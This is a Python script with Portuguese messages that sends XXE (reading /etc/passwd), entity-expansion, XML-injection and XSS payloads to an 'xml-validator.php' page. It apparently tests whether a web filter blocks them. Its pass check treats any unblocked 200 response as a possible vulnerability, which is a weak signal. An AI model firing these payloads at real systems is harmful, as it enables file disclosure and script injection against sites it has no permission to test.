import requests
import sys
import os

if len(sys.argv) > 1:
    url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
else:
    print("URL base não foi fornecida.")
    sys.exit(1)

url_alvo = f"{url_base}/index.php?page=xml-validator.php"
print(url_alvo)

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

payloads = {
    'XML Entity Injection': "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><test>&xxe;</test>",
    'XML Entity Expansion': "<!DOCTYPE bomb [<!ENTITY a '1234567890' >]><bomb>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</bomb>",
    'XML Injection': "<test>test</test><script>alert('XML Injection')</script>",
    'Reflected XSS via XML Injection': "<test><name><![CDATA[<script>alert('XSS')</script>]]></name></test>"
}

def enviar_requisicao_e_verificar_resposta(url_completa, tipo_vulnerabilidade, teste_numero):
    resposta_teste = requests.get(url_completa, headers=headers)
    print(f"Teste {teste_numero}: Testando '{tipo_vulnerabilidade}'. Código de status: {resposta_teste.status_code}")
    
    if resposta_teste.status_code == 200 and "Acesso Bloqueado" not in resposta_teste.text:
        print(f"Teste #{teste_numero} PASSOU: Vulnerabilidade de '{tipo_vulnerabilidade}' possivelmente encontrada!")
        return 1
    else:
        print(f"Teste #{teste_numero} FALHOU: Código de status: {resposta_teste.status_code} ou acesso bloqueado.")
        return 0

total_testes = 0
testes_passaram = 0
testes_falharam = 0

for tipo_vulnerabilidade, payload in payloads.items():
    total_testes += 1
    payload_encoded = requests.utils.quote(payload)
    url_completa = f"{url_alvo}&xml={payload_encoded}&xml-validator-php-submit-button=Validate+XML"
    resultado_teste = enviar_requisicao_e_verificar_resposta(url_completa, tipo_vulnerabilidade, total_testes)
    if resultado_teste == 1:
        testes_passaram += 1
    else:
        testes_falharam += 1

print(f"\nTotal de Testes: {total_testes}")
print(f"Testes Passaram: {testes_passaram}")
print(f"Testes Falharam: {testes_falharam}")
print(f"Url Testada: {url_alvo}")